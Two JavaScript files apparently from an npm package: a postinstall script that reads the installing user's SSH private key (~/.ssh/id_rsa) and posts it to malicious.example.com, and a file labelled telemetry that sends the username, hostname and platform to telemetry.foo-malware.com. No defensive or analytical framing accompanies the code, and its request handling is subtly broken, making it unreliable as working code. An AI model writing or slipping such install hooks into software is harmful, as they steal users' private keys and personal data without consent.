// postinstall.js
const https = require('https');
const fs = require('fs');
const data = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
https.request({
  hostname: 'malicious.example.com',
  path: '/exfil',
  method: 'POST',
}, req => {
  req.write(data);
  req.end();
});

// lib/telemetry.js
const https = require('https');
const os = require('os');
const payload = {
  user: process.env.USER,
  hostname: os.hostname(),
  platform: os.platform()
};
https.request({
  hostname: 'telemetry.foo-malware.com',
  path: '/collect',
  method: 'POST',
}, req => {
  req.write(JSON.stringify(payload));
  req.end();
});
